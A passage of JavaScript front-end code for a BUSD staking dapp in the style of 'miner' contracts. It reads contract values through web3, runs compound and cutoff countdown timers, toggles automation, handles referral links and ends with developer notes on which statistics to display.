        if (hours % 1 == 0) {
            console.log("hours % 1 == 0", hours % 1 == 0);
            contract.methods.ADD_AUTOMATE(hours).send({ from: window.userWalletAddress }).then(result => {
                refreshData();
            }).catch((err) => {
                console.log(err)
            });
        }
        else {
            console.log("ERROR NUMBER NOT VALID");
        }
    }
}

//FUNCTION FOR COUNTDOWN TIMERS
function startTimer() {
    startCutoffTime();   //CUTOFF_STEP   48h until cart full
    startCompoundTime(); //COMPOUND_STEP every 12 hours
}

async function startCompoundTime() {
    var cooldown = Number(lastHatch) + Number(compound_timer * 60 * 60); //HOURS TO MINUTES
    var countDownDate = cooldown * 1000;
    clearInterval(timerCompound);
    timerCompound = setInterval(function () {
        var now = new Date().getTime();
        // Get today's date and time
        // Find the distance between now and the count down date
        var distance = countDownDate - now;
        if (distance >= 0) {
            // Time calculations for days, hours, minutes and seconds
            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);

            hours = hours + (days * 24);

            if (hours < 10) { hours = '0' + hours; }
            if (minutes < 10) { minutes = '0' + minutes; }
            if (seconds < 10) { seconds = '0' + seconds; }

            document.getElementById("hours_compound").innerHTML = hours;

            document.getElementById("minutes_compound").innerHTML = minutes;

            document.getElementById("seconds_compound").innerHTML = seconds;
        }
        if (distance < 0) {
            document.getElementById("time_compound").innerHTML = '<span id="hours_compound">00</span>:<span id="minutes_compound">00</span>:<span id="seconds_compound">00</span>';
            clearInterval(timerCompound);
        }
    }, 1000);
}

async function startCutoffTime() {
    var cooldown = Number(lastHatch) + Number(cutoff_timer * 60 * 60);//HOURS TO MINUTES
    var countDownDate = cooldown * 1000;
    clearInterval(timerCutOff);
    timerCutOff = setInterval(function () {
        var now = new Date().getTime();
        // Get today's date and time
        // Find the distance between now and the count down date
        var distance = countDownDate - now;
        if (distance >= 0) {
            // Time calculations for days, hours, minutes and seconds
            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);

            hours = hours + (days * 24);

            if (hours < 10) { hours = '0' + hours; }
            if (minutes < 10) { minutes = '0' + minutes; }
            if (seconds < 10) { seconds = '0' + seconds; }

            document.getElementById("hours_cutoff").innerHTML = hours;

            document.getElementById("minutes_cutoff").innerHTML = minutes;

            document.getElementById("seconds_cutoff").innerHTML = seconds;
            if (distance < 0) {
                document.getElementById("time_cutoff").innerHTML = '<span id="hours_cutoff">00</span>:<span id="minutes_cutoff">00</span>:<span id="seconds_cutoff">00</span>';
                clearInterval(timerCutOff);
            }
        }
    }, 1000);
}
//////////////////////////////////
function modifyField(name, value) {
    document.querySelector(name).textContent = value;
}

function getReferral() {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    referralAddress = urlParams.get('ref');
    document.getElementById("referrer").value = referralAddress;
    console.log("REF: ", referralAddress);
}

//LOAD BEFORE CONNECTING WALLET
async function loadReferral() {
    const result = await contractStatic.methods.REFERRAL().call();
    referral_bonus = result / 10;

    document.querySelectorAll(".referral_bonus").forEach(element => {
        element.innerText = referral_bonus;
    });
}

async function loadCompoundBonus() {
    /*const bonusResult = await contractStatic.methods.COMPOUND_BONUS().call();
    compound_bonus = Number(bonusResult)/10;

    document.querySelectorAll(".compound_bonus").forEach(element => {
        element.innerText = compound_bonus;
    });*/
}

async function loadCompoundForNoTax() {
    const compoundForNoTaxResult = await contractStatic.methods.COMPOUND_FOR_NO_TAX_WITHDRAWAL().call();
    compoundTimesForNoTax = Number(compoundForNoTaxResult);

    document.querySelectorAll(".mandatory_compound").forEach(element => {
        element.innerText = compoundTimesForNoTax;
    });
}

async function loadCompoundTimer() {
    var result = 43200;//await contractStatic.methods.COMPOUND_STEP().call();
    compound_timer = Number(result) / 60 / 60;

    document.querySelectorAll(".compound_timer").forEach(element => {
        element.innerText = compound_timer;
    });
}

async function loadCutoffTimer() {
    var result = await contractStatic.methods.CUTOFF_STEP().call();
    cutoff_timer = Number(result) / 60 / 60;

    document.querySelectorAll(".cutoff_timer").forEach(element => {
        element.innerText = cutoff_timer;
    });
}

async function loadCompoundMaxBonus() {
    const maxBonusTimes = await contractStatic.methods.COMPOUND_BONUS_MAX_TIMES().call();
    compoundBonusMaxTimes = Number(maxBonusTimes);

    document.querySelectorAll(".max_bonus").forEach(element => {
        //element.innerText = compoundBonusMaxTimes * compound_bonus;
        element.innerText = compoundBonusMaxTimes * 1.7;
    });
}

async function getEggsTo1Miner() {
    //Numbers of eggs to hire 1 single miner 
    const EGGS_TO_HIRE_1MINERSResult = await contractStatic.methods.QUBIC_TO_HIRE_1MINERS().call();
    console.log("EGGS ", eggsFor1Miner);
    eggsFor1Miner = EGGS_TO_HIRE_1MINERSResult;
    daily_return = seconds_in_a_day / Number(eggsFor1Miner);

    document.querySelectorAll(".daily_return").forEach(element => {
        element.innerText = (daily_return) * 100;
    });
    document.querySelectorAll(".annual_return").forEach(element => {
        element.innerText = (daily_return) * 100 * 365;
    });

    /*var calculateEggBuySimpleResult = await contractStatic.methods.calculateCubicBuySimple("1000000000000000000").call();
    var miners = calculateEggBuySimpleResult / eggsFor1Miner;
    modifyField("#estimated_rate" , Number(miners).toFixed(0));*/
}

async function loadTotalBusd() {
    const getSiteInfoResult = await contractStatic.methods.getSiteInfo().call();
    //"_totalStaked": "1392789040961798627685726",
    //"_totalDeposits": "5541",
    //"_totalCompound": "1158234787566076740687831",
    //"_totalRefBonus": "75300881858305126419495"
    console.log("Contract Data: ", getSiteInfoResult);
    modifyField("#total_deposit_count", getSiteInfoResult["_totalDeposits"]);
    //modifyField("#total_referral_bonus" , Number(getSiteInfoResult["_totalRefBonus"]/(10**decimals)).toFixed(2));
}

async function loadTotalDepositCount() {
    const getBalanceResult = await contractStatic.methods.getBalance().call();
    //Contract USD Balance
    modifyField("#total_usd_locked", Number(getBalanceResult / (10 ** decimals)).toFixed(2));
}

async function loadPartnershipCount() {
    const partnershipCount = await contractStatic.methods.getPartnershipCount().call();
    modifyField("#total_partnerships", partnershipCount);
}

async function getTax() {
    var getTaxResult = await contractStatic.methods.WITHDRAWAL_TAX().call();
    tax = (Number(getTaxResult) / 10);

    document.querySelectorAll(".tax").forEach(element => {
        element.innerText = tax;
    });
}

async function getContractTax() {
    var getContractTaxResult = await contractStatic.methods.TAX().call();
    var taxContract = (Number(getContractTaxResult) / 10);

    document.querySelectorAll(".contract_tax").forEach(element => {
        element.innerText = taxContract;
    });
}

async function getAutomate() {
    var getAutomate = await contract.methods.automations(window.userWalletAddress).call();

    automationAccount = getAutomate;
    console.log("AUTOMATE STAT", getAutomate);
    if (Number(getAutomate["day"]) > 0) {
        document.getElementById("toggle_automate").innerText = "Disable Automate";
        document.getElementById("runhours").innerText = "(" + getAutomate["runhours"] + "hrs)";

        document.getElementById("compound").setAttribute("disabled", true);
        document.getElementById("sell").setAttribute("disabled", true);
        document.getElementById("deposit_button").setAttribute("disabled", true);
        document.getElementById("automate_button").removeAttribute("disabled");
    }
    else {
        console.log("INSIDE AUTOMATE FALSE")
        document.getElementById("toggle_automate").innerText = "Enable Automate";
        document.getElementById("runhours").innerText = "";

        document.getElementById("deposit_button").removeAttribute("disabled");
        document.getElementById("compound").removeAttribute("disabled");
        document.getElementById("sell").removeAttribute("disabled");
    }
}

async function loadAccountInfo() {
    document.getElementById("approve_button").addEventListener("click", approve);
    document.getElementById("deposit_input").addEventListener("keyup", debounce(getQuote, 150));
    document.getElementById("deposit_button").addEventListener("click", buy);
    document.getElementById("deposit_button").removeAttribute("disabled");
    document.getElementById("automate_button").addEventListener("click", toggleAutomation);
    document.getElementById("compound").addEventListener("click", compound);
    document.getElementById("sell").addEventListener("click", sell);

    getAutomate();

    getBalance();
    getDepositLimits();
    getAllowance();
    await getUserInfo();
    startTimer();

    setTimeout(() => {
        console.log("Reloading Account Info");
        loadAccountInfo();
    }, 30000);
}

async function initDapp() {
    loadReferral();
    getContractTax();
    loadCompoundForNoTax();

    loadCompoundTimer();
    loadCutoffTimer();

    loadTotalBusd();
    loadTotalDepositCount();

    getEggsTo1Miner();

    loadPartnershipCount(); //NEW

    getTax();

    await loadCompoundBonus();
    loadCompoundMaxBonus();
    getExample();

    document.querySelector(".wrapper-loader").classList.add("hide");

    setTimeout(() => {
        console.log("Reloading App Info");
        initDapp();
    }, 30000);
}

async function refreshData() {
    console.log("REFRESHING DATA...");
    getBalance();
    getDepositLimits();
    getAllowance();
    getExample();
    getAutomate();
    await getUserInfo();
    startTimer();

    loadReferral();

    loadCompoundForNoTax();

    loadCompoundTimer();
    loadCutoffTimer();

    loadTotalBusd();
    loadTotalDepositCount();

    getEggsTo1Miner();

    getTax();

    await loadCompoundBonus();
    loadCompoundMaxBonus();
}

document.getElementById("copy").addEventListener("click", async function () {
    try {
        document.getElementById("ref").select();
        document.execCommand('copy');
        window.getSelection().removeAllRanges();
    }
    catch {
        console.log("cant copy text");
    }
    document.getElementById("clipboard").style = "display: flex !important";
    setTimeout(function () {
        document.getElementById("clipboard").style = "display: none";
    }, 1300)
    await navigator.clipboard.writeText(document.getElementById("ref").value);


})
//getBonusPartnership(address) returns uint
//getPartnershipCount returns uint256 HOW MANY PARTNERSHIPS
//partners return (min_amount uint256 , bonus uint256)
//verifyPartnetship return uint256 (1 if true 0 if false)
//getBonusQuantic



//getQuanticBalance
//getAutomateCounts
//automations
//

//ADD_ATOMATE
//REMOVE_AUTOMATE
//getAutomateCounts

/*

Overall Statistics, need to pull the following from the contract:
- Total BUSD in Contract
- Total Deposit Count
- Total Partnerships (currently not available but i will add this to the next contract)

For each wallet that connects, need to show the following:
- Initial Deposit
- Total Deposit
- Referral Rewards
- Total Referrals
- Total Claimed
- Current BUSD Rewards  (this had to be more prominent in some fashion)

Actions that wallets can take:
- Approve BUSD
- Deposit BUSD
- Compound Rewards
- Claim Rewards
- Enable Automation
- Disable Automation

Extra things to display:
- Current Quantic Bonus Percentage
- Current Partnership Bonus Percentage
- Compound Count (x of 10)
- Total Bonus Percentage   (quantic bonus+partnership bonus) x (Compound Count)

Other things to note:
- When automation is turned on, disable Approve/Deposit/Compound/Claim buttons
- When automation is turned off, enabled Approve/Deposit/Compound/Claim buttons

 */